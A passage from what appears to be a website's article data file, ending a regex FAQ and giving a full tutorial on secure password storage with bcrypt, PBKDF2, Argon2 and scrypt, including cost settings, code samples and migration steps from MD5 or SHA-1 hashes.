Different regex engines support different features. Lookaheads/lookbehinds, named groups, and Unicode properties vary by engine. JavaScript lacks lookbehind in older environments; Python's \`re\` module has full lookbehind support.

**How do I match a literal dot, asterisk, or other special character?**
Escape it with a backslash: \`\\.\` matches a literal dot; \`\\*\` matches a literal asterisk.

→ Use the [Regex Tester](/regex-tester) to write, test, and debug regex patterns interactively — with real-time match highlighting and flag toggles.`,
  },
  {
    slug: 'password-hashing-bcrypt-sha256-guide',
    toolPath: '/bcrypt',
    title: 'Password Hashing Explained: bcrypt, SHA-256, Argon2, and What to Actually Use',
    description: 'Understand why password hashing is different from encryption, how bcrypt, SHA-256, PBKDF2, and Argon2 work, and which algorithm to choose for storing passwords securely in 2026.',
    keywords: ['password hashing', 'bcrypt vs sha256', 'how to hash passwords', 'password security', 'argon2 bcrypt', 'secure password storage'],
    category: 'Crypto',
    publishedAt: '2026-05-26',
    content: `## Hashing vs Encryption: A Critical Distinction

Before choosing an algorithm, understand what you're actually doing.

**Encryption** is reversible — you can decrypt ciphertext back to plaintext with the right key. You'd use encryption to protect data you need to read later: credit card numbers, medical records, private messages.

**Hashing** is one-way — a hash function takes input and produces a fixed-size output (the hash or digest), and there's no algorithm to reverse it. You cannot go from the hash back to the original password.

**Why is one-way better for passwords?** Because you don't need to know the user's password — you only need to verify it. When a user logs in, you hash what they typed and compare it to the stored hash. If they match, the passwords match. The actual password never needs to be stored or recovered.

If someone steals your database, they get hashes — not passwords. They'd have to crack each hash individually.

## Why Not Just Use SHA-256?

SHA-256 is a cryptographic hash function designed for speed. It can compute billions of hashes per second on modern hardware, especially with GPU acceleration. That's great for verifying file integrity. It's catastrophic for password storage.

An attacker with a leaked database of SHA-256 password hashes can run dictionary attacks and rainbow table attacks at staggering speed:
- A modern GPU can compute ~10 billion SHA-256 hashes per second
- An 8-character password with lowercase letters and digits has ~2.8 trillion combinations
- At 10 billion/second, cracking all combinations takes about 4.6 minutes

SHA-256 is explicitly not designed for password hashing. Using it for passwords is a well-known security mistake.

The same applies to MD5 (even faster, also broken for other reasons) and raw SHA-1/SHA-512.

## What Makes a Good Password Hashing Algorithm?

Good password hashing algorithms are designed to be slow — deliberately, tunable, and in ways that help defenders more than attackers.

**Key properties:**

1. **Slow by design** — Each hash should take 100–300ms on your hardware. Fast for a legitimate user login; painfully slow when an attacker needs to try millions of guesses.

2. **Work factor adjustable** — As hardware gets faster, you need to increase the cost. Good algorithms let you tune the cost parameter.

3. **Salt included** — A random value mixed into each hash before computing, unique per password. This prevents rainbow table attacks (precomputed hash tables) and ensures two users with the same password get different hashes.

4. **Memory-hard (ideal)** — Some algorithms require significant RAM per computation. GPUs have many cores but limited memory bandwidth per core, making memory-hard algorithms especially resistant to GPU cracking.

## The Algorithms

### bcrypt

Designed specifically for password hashing in 1999. Still the most widely deployed password hashing algorithm in the world.

**How it works:** Takes a password and a random 16-byte salt. Uses the Blowfish cipher key schedule (known to be expensive) iteratively. The cost parameter N means the algorithm runs 2^N iterations.

\`\`\`
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/lfz3Fkxtu6RNWz9tK
 ^^  ^^                              
 |   cost factor (12 = 2^12 = 4096 rounds)
 version identifier
\`\`\`

**Cost factor guide:**
| Cost | Approx time on modern server | Use case |
|------|------------------------------|----------|
| 10 | ~100ms | Minimum for production |
| 12 | ~300ms | Recommended default |
| 14 | ~1 second | High-security accounts |
| 16 | ~4 seconds | Admin accounts, financial |

**Limitation:** bcrypt truncates passwords at 72 bytes. A password longer than 72 characters gets truncated silently. This rarely matters in practice but is worth knowing.

\`\`\`javascript
// Node.js
const bcrypt = require('bcrypt');
const saltRounds = 12;

// Hash
const hash = await bcrypt.hash(plainTextPassword, saltRounds);

// Verify
const match = await bcrypt.compare(plainTextPassword, storedHash);
\`\`\`

\`\`\`python
# Python
import bcrypt

# Hash
password = b'mysecretpassword'
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Verify
bcrypt.checkpw(password, hashed)  # True or False
\`\`\`

### PBKDF2

Password-Based Key Derivation Function 2. Defined in RFC 8018. Built into many standard libraries and compliance frameworks (NIST-approved, FIPS 140 compatible).

**How it works:** Applies a pseudorandom function (typically HMAC-SHA256 or HMAC-SHA512) repeatedly, using the iteration count as the work factor.

**Iteration count guide (2026):**
- OWASP recommends: **600,000 iterations with HMAC-SHA256**
- NIST SP 800-63B recommends: **at least 10,000** (older guidance, aim higher)

\`\`\`python
import hashlib
import os

# Hash
salt = os.urandom(32)
key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)

# Store: salt + key (both as hex or bytes)
\`\`\`

PBKDF2's weakness: it's not memory-hard. GPUs can parallelize it efficiently. At equivalent speed settings, bcrypt and Argon2 are harder to crack with specialized hardware.

### Argon2

The winner of the Password Hashing Competition (2015). The current gold standard, recommended by OWASP for new systems.

**Three variants:**
- **Argon2d** — Maximizes resistance to GPU cracking, susceptible to side-channel attacks. For cryptocurrency.
- **Argon2i** — Resistant to side-channel attacks. For password hashing in most apps.
- **Argon2id** — Hybrid of both. Recommended default.

**Configurable parameters:**
- **Memory cost** (m) — RAM usage in kilobytes. Minimum 64 MB, recommend 128 MB+.
- **Time cost** (t) — Number of iterations. Start at 3.
- **Parallelism** (p) — Number of parallel threads. Match your server's CPU cores.

\`\`\`python
# Python (argon2-cffi)
from argon2 import PasswordHasher

ph = PasswordHasher(time_cost=3, memory_cost=131072, parallelism=4)  # 128 MB

# Hash
hash = ph.hash("mysecretpassword")

# Verify
try:
    ph.verify(hash, "mysecretpassword")  # Returns True
except Exception:
    pass  # Wrong password
\`\`\`

\`\`\`javascript
// Node.js (argon2)
const argon2 = require('argon2');

const hash = await argon2.hash('mysecretpassword', {
  type: argon2.argon2id,
  memoryCost: 131072,  // 128 MB
  timeCost: 3,
  parallelism: 4,
});

const valid = await argon2.verify(hash, 'mysecretpassword');
\`\`\`

### scrypt

Designed by Colin Percival in 2009. Memory-hard before Argon2 existed. Still widely used and secure.

Parameters: N (CPU/memory cost), r (block size), p (parallelism). OWASP recommends: N=65536, r=8, p=1 as a minimum.

\`\`\`javascript
const crypto = require('crypto');
const salt = crypto.randomBytes(32);

crypto.scrypt('password', salt, 64, { N: 65536, r: 8, p: 1 }, (err, derivedKey) => {
  // derivedKey is the hash
});
\`\`\`

## Which Algorithm Should You Use?

| Scenario | Recommendation |
|----------|---------------|
| New application (2026) | **Argon2id** |
| Platform with FIPS compliance required | **PBKDF2** with HMAC-SHA512, 600k iterations |
| Adding password hashing to an existing system | **bcrypt** (widely supported, proven) |
| Migrating from MD5/SHA1 | Any of the above — immediately |
| Need to hash many passwords per second | Tune the cost down (not below safety thresholds) |

**Never use:** MD5, SHA-1, SHA-256, SHA-512, plain or unsalted for password storage.

## Migrating from Insecure Hashes

If you have a database of MD5 or SHA-1 password hashes, migrate without requiring a mass password reset:

1. Add a new column \`password_hash_v2\` (nullable)
2. On successful login (when you have the plaintext password): compute bcrypt/Argon2 hash, store in v2
3. Check v2 first on login; fall back to v1 if v2 is null
4. After 90 days, force a password reset for accounts still on v1
5. Drop the v1 column

This lets you upgrade silently for active users and handle the rest with a forced reset.

## Common Mistakes

**Storing plaintext passwords** — The most catastrophic mistake. Used by ~30% of breached companies according to public breach reports.

**Using fast hash functions** — MD5, SHA-1, SHA-256 for password storage. Fast is bad here.

**Forgetting the salt** — Unsalted bcrypt is far weaker. All good libraries handle salting automatically — don't implement it manually.

**Using the same salt for all passwords** — The salt must be unique per password, generated randomly each time.

**Not re-hashing on login** — If you increase the cost factor over time, re-hash the password (using the new cost factor) when the user successfully logs in. Many libraries handle this with a "needs rehash" check.

\`\`\`javascript
// bcrypt: re-hash if cost factor changed
const currentHash = getHashFromDB(userId);
if (await bcrypt.compare(password, currentHash)) {
  if (bcrypt.getRounds(currentHash) < TARGET_ROUNDS) {
    const newHash = await bcrypt.hash(password, TARGET_ROUNDS);
    updateHashInDB(userId, newHash);
  }
  // login success
}
\`\`\`

→ Use the [Bcrypt Tool](/bcrypt) to hash and verify passwords in the browser — useful for testing cost factors and verifying existing hashes.`,
  },
];